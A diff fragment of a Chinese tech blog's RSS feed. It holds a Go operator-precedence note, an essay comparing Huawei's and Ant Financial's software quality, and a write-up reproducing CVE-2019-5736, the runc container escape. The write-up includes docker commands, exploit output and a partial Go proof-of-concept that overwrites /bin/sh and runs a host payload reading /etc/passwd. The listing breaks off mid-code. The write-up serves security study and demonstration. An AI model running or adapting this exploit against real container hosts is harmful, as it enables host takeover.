+&lt;li&gt;单目运算符优先级最高。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;单目运算符包括：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;&amp;#34;+&amp;#34; | &amp;#34;-&amp;#34; | &amp;#34;!&amp;#34; | &amp;#34;^&amp;#34; | &amp;#34;*&amp;#34; | &amp;#34;&amp;amp;&amp;#34; | &amp;#34;&amp;lt;-&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start="2"&gt;
+&lt;li&gt;双目运算符分5个优先级，从高到低为&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;Precedence Operator
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;2&lt;/span&gt;&lt;span class="cl"&gt; 5 * / % &amp;lt;&amp;lt; &amp;gt;&amp;gt; &amp;amp; &amp;amp;^
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;3&lt;/span&gt;&lt;span class="cl"&gt; 4 + - | ^
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;4&lt;/span&gt;&lt;span class="cl"&gt; 3 == != &amp;lt; &amp;lt;= &amp;gt; &amp;gt;=
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;5&lt;/span&gt;&lt;span class="cl"&gt; 2 &amp;amp;&amp;amp;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;6&lt;/span&gt;&lt;span class="cl"&gt; 1 ||
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分别是：
+“乘法类”，“加法类”，“比较类”，“逻辑与”，“逻辑或”，优先级最低的是“逻辑或”。&lt;/p&gt;</description></item><item><title>你的软件是“椰子”还是“苹果”？</title><link>https://weizhang555.github.io/original/different-software-types/</link><pubDate>Wed, 21 Apr 2021 14:14:13 +0800</pubDate><guid>https://weizhang555.github.io/original/different-software-types/</guid><description>
+&lt;hr&gt;
+&lt;p&gt;我至今在两家公司工作过，第一家是华为，第二家是蚂蚁金服。在两家待的时间都足够长了，谈谈对两家公司软件质量控制的一点感悟。&lt;/p&gt;
+&lt;p&gt;用一句话来对比两家的软件质量的话，我称为“椰子型”和“苹果型”。两家公司基本可以代表传统软件公司与互联网公司的不同的质量管理标准。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="椰子型"&gt;&lt;u&gt;椰子型&lt;/u&gt;&lt;/h2&gt;
+&lt;p&gt;华为擅长做“椰子型”软件，外壳坚硬无比，内部一包水。&lt;/p&gt;
+&lt;p&gt;华为的研发流程是很早就花大价钱从IBM引入的IPD研发流程，大致分为几个流程(&lt;a href="http://www.uml.org.cn/jchgj/201804204.asp"&gt;参考&lt;/a&gt;)：&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Charter(立项) --&amp;gt; TR1/2/3 --&amp;gt; PDCP(中期) --&amp;gt; TR4/5 --&amp;gt; EDCP(结项)&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;一个项目周期基本上是一年，PDCP之前是项目的设计和PoC阶段，可以改方案和设计，PDCP之后就不允许修改设计了，TR5要达到验收标准，
+验收不过等同于项目延期，会对项目的Manager和团队的考评有重大影响，所以TR5的验收是极其重要且严肃的。&lt;/p&gt;
+&lt;p&gt;整个开发模型沿用了很多年，基本上是个大的软件开发瀑布模型，周期长，与现在倡导的敏捷开发模式完全背道而驰。
+这套开发模式引入之后一直在使用，使得华为一直对软件质量有着极其优秀的掌控，帮助华为站稳了ICT和企业市场，但过于笨重也遭到了很多内部人员的吐槽。
+所以在云BU成立以后，也做了局部的敏捷开发的尝试。&lt;/p&gt;
+&lt;p&gt;华为的整个研发体系和流程都是很笨重的，也很严肃。研发人员和测试人员的比例可以达到2:1左右（各个部门有不同），由于大量的测试人员的存在，对外出口的软件质量是极好的，不会出现太明显的Bug和崩溃等现象。&lt;/p&gt;
+&lt;p&gt;所以在我看来，对外表现的是“椰子型”的外壳。&lt;/p&gt;
+&lt;p&gt;但是我比较受不了的一点是，内部的人员质量参差不齐，差的真的是太差了。在我参加“三营”培训时，10个人一组做敏捷开发的培训，全组竟然只有我一个人能写程序，其他9个人给我做测试，也是很搞笑。更可笑的是我们组最后做出来的软件评分是第一名，可能是由于开发：测试达到了1:9吧。&lt;/p&gt;
+&lt;p&gt;大量的低水平开发造就了垃圾一般的代码质量，所以华为的软件只能黑盒来用，要是你看到了实现的代码，怕是要战战兢兢吐一口老血了。&lt;/p&gt;
+&lt;p&gt;“水”代码其实也不能完全怪垃圾程序员，我自己也写过很多自己不屑的垃圾代码，让我来告诉你原因。&lt;/p&gt;
+&lt;p&gt;在最后的突击测试阶段，管理者是要看测试的漏洞数据的，要求随时间的推进测试人员发现的代码bug数应该递减，最后趋近于0，这很合理对吧？
+还有两项要求，要看bug的解决时长，这个关乎manager的考核指标，所以要求每日的bug要日清；并且TR5时系统内的bug必须清0，我不管是多么难解或者重大的bug，一定要修复。&lt;/p&gt;
+&lt;p&gt;这两项要求给我造成了巨大的麻烦，设想一下下午6点的时候，测试给你提了5个bug，你挨个看了一下，有1个几乎不可能在短时间解决，于是你跟领导反馈，领导说必须严格按照质量标准，今天一定要解决。
+这个情况就多次发生在了我的身上，于是在通宵都仍然无法解决的情况下，只能用大量的workaround去想办法从cmdline和api调用层面屏蔽掉这个bug，于是我亲手给这座代码屎山贡献了更多。最终这包屎山变成了“椰子”来到了用户手里。&lt;/p&gt;
+&lt;p&gt;内部的整套研发流程，在我看来是有好有坏的，确实严格的管理流程给了华为对产品的严密把控。华为就是有30%的一流人才带着70%的庸才做出来世界一流软件的质量，但是对我这种有点轻微代码洁癖的人来说，是无法忍受的。
+我也迫切的希望能与更多优秀的人合作，而不是浪费时间教笨人做事，所以离开华为，加入了互联网公司，希望能找到更多志同道合的人。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="苹果型"&gt;&lt;u&gt;苹果型&lt;/u&gt;&lt;/h2&gt;
+&lt;p&gt;互联网公司就是完全的另一个极端了，我来介绍下蚂蚁的研发流程：&lt;/p&gt;
+&lt;p&gt;[流程加载失败...]&lt;/p&gt;
+&lt;p&gt;你没看错，没有研发流程，质量把控流程完全没有，测试工程师也很少。
+据我所知，这种模式在互联网公司比较流行，即使是Google，Facebook这种大厂也是如此，Facebook是全栈工程师，每个人开发的组件直接上线运行和实测，所以听闻Google的工程师经常嘲讽Facebook是“踩着香蕉皮滑行”，滑到哪儿算哪儿。&lt;/p&gt;
+&lt;p&gt;这种模式之所以并没有引起大的问题，在我看来主要是两点原因：&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;u&gt;1.人员平均水平较高&lt;/u&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;每个人的主观能动性比较高，代码平均质量较高，会主动写单元测试和集成测试，习惯于敏捷开发，CI/CD。靠着优秀程序员的自我修养，代码质量仍然获得了一定的保证。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;u&gt;2.面向消费者业务较多，bug不敏感&lt;/u&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;ToC的业务对产品的质量要求并没有企业级或CT级要求高，Web形态的产品完全可以先推一个公测版的产品出去试试效果，对于Bug的存在是有一定容忍度的。本身互联网产品迭代快，对速度的要求胜过对质量的要求。&lt;/p&gt;
+&lt;p&gt;所以好的互联网公司的产品质量通常是“苹果型”的，外表摸起来有一点点硬，打开来看，内部代码质量也不错。
+由于测试人员缺失以及快速迭代的需求，很难将外表做的像椰子一样。&lt;/p&gt;
+&lt;p&gt;互联网的开发流程较敏捷，留给工程师的自由发挥空间比较大，所以从我个人来说，是更喜欢互联网这种模式的。二八效应决定着一套80分的软件做到100分需要额外耗费巨大的人力，在不成正比的投入产出面前，有必要衡量下是否要继续优化下去？&lt;/p&gt;
+&lt;p&gt;没有流程其实造成了更大的问题，项目立项随意，周期随意，没有验收标准，为了KPI每个人都在努力的造轮子却不管重复不重复。所以我看到的是，对外我们是有无数的黑科技呈现出来，从外部看我们的软件研发能力是无比强大的，但是很多黑科技只能偏居一隅没有机会获得大规模推广，大规模推广的项目也有很多致命的缺陷导致寿命不长。&lt;/p&gt;
+&lt;p&gt;由此，阿里巴巴已经开始沦落为“geek的自留地”，自己内部玩的嗨，更多的却是“内卷”而不是创造实际价值。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="选哪个"&gt;&lt;u&gt;选哪个？&lt;/u&gt;&lt;/h2&gt;
+&lt;p&gt;二八效应对应着中国的一句成语“行百里者半九十”，所以在继续提升产品质量的时候，我们都要掂量一下是否值得如此大的投入？&lt;/p&gt;
+&lt;p&gt;不同的企业会有不同的选择，ToB or ToC的选择会有大的不同。在我还在华为的时候，我痛恨70%的庸才拉低了华为的档次，拉低了我对外的credit，但是华为的80分到90分恰恰需要70%的庸才作为一颗颗螺丝钉消耗自身的精力来完成，而Google，Facebook的优秀人才们只愿意做软件开发的前一部分创造性的工作做到85分，而非整天无休止的消耗自己。由此造就了“椰子型”与“苹果型”软件的不同。&lt;/p&gt;
+&lt;p&gt;选哪个？从政治正确的角度考虑，我们要做“石头型”的软件，从公司层面，“椰子型”是不错的选择，从工程师个人角度，还是“苹果型”更加友好。&lt;/p&gt;
+&lt;p&gt;我现在要承认，自己还是很怀念IPD研发流程的，它可恨却又很有用，帮助产品找到正确的方向以及一直运行在正确的轨道上。蚂蚁相比华为，还是有小作坊vs大厂的既视感的，但是我无意贬低任意一家，对前东家和现东家我内心都是喜欢的。&lt;/p&gt;
+&lt;p&gt;Respect to everything!&lt;/p&gt;</description></item><item><title>docker-runc主机逃逸漏洞复现：CVE-2019-5736</title><link>https://weizhang555.github.io/original/runc-host-escape-cve/</link><pubDate>Wed, 11 Dec 2019 11:30:46 +0800</pubDate><guid>https://weizhang555.github.io/original/runc-host-escape-cve/</guid><description>
+&lt;p&gt;CVE-2019-5736是一个比较知名的runc漏洞，利用方式简单，危害很大，经常被拿来做云原生安全的攻击/防御演示。&lt;/p&gt;
+&lt;p&gt;我最近也研究了下这个漏洞的使用，研究的第一步首先是复现。&lt;/p&gt;
+&lt;p&gt;尝试了github上的示例： &lt;a href="https://github.com/Frichetten/CVE-2019-5736-PoC"&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/a&gt; ，
+这里对源码做了一些修改，在下面分享一下。&lt;/p&gt;
+&lt;p&gt;注意：ubuntu上安装的docker 18.06似乎已经打上了补丁，我手动编译了runc的1.0.0-rc5版本才成功复现。&lt;/p&gt;
+&lt;p&gt;复现方式：&lt;/p&gt;
+&lt;p&gt;在一个terminal里面：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;zhangwei@zhangwei-ubuntu-vm:~/program/gocode/src/github.com/Frichetten/CVE-2019-5736-PoC$ docker run -ti -v &lt;span class="nv"&gt;$PWD&lt;/span&gt;/exploit:/exploit ubuntu:18.04 bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;另一个terminal内执行：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; -ti 5b28d7ab5083 /bin/sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此时第一个terminal的打印：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;1&lt;/span&gt;&lt;span class="cl"&gt;zhangwei@zhangwei-ubuntu-vm:~/program/gocode/src/github.com/Frichetten/CVE-2019-5736-PoC$ docker run -ti -v &lt;span class="nv"&gt;$PWD&lt;/span&gt;/exploit:/exploit ubuntu:18.04 bash
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;2&lt;/span&gt;&lt;span class="cl"&gt;root@5b28d7ab5083:/# /exploit
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;3&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Overwritten /bin/sh successfully
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;4&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Found the PID: &lt;span class="m"&gt;17&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;5&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Successfully got the file handle
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;6&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;-&lt;span class="o"&gt;]&lt;/span&gt;Failed to open /proc/self/fd/3: open /proc/self/fd/3: text file busy
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;7&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Successfully got write handle &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;0xc0000501e0&lt;span class="o"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;8&lt;/span&gt;&lt;span class="cl"&gt;root@5b28d7ab5083:/#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;/tmp/&lt;/code&gt;下多了一个passwd文件。&lt;/p&gt;
+&lt;p&gt;Ubuntu下面没有原demo里使用的/etc/shadow文件，所以我修改成了/etc/passwd，会被copy到/tmp/目录下。&lt;/p&gt;
+&lt;p&gt;修改过的源码：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-go" data-lang="go"&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 1&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="kn"&gt;package&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 2&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 3&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// Implementation of CVE-2019-5736&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 4&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// Created with help from @singe, @_cablethief, and @feexd.&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 5&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// This commit also helped a ton to understand the vuln&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 6&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 7&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="kn"&gt;import&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 8&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt; 9&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;io/ioutil&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;10&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;os&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;11&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;strconv&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;12&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;strings&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;13&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;time&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;14&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;15&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;16&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// This is the line of shell commands that will execute on the host&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;17&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="kd"&gt;var&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;#!/bin/bash \n cat /etc/passwd &amp;gt; /tmp/passwd &amp;amp;&amp;amp; chmod 777 /tmp/shadow&amp;#34;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;18&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;19&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="kd"&gt;func&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;20&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;// First we overwrite /bin/sh with the /proc/self/exe interpreter path&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;21&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;os&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;22&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;nil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;23&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;24&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;25&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;26&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Fprintln&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#34;#!/proc/self/exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;27&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;28&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;nil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;29&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;30&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;31&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;32&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;[+] Overwritten /bin/sh successfully&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;33&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;34&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;// Loop through all processes to find one whose cmdline includes runcinit&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;35&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;// This will be the process created by runc&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="ln"&gt;36&lt;/span&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;found&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt;
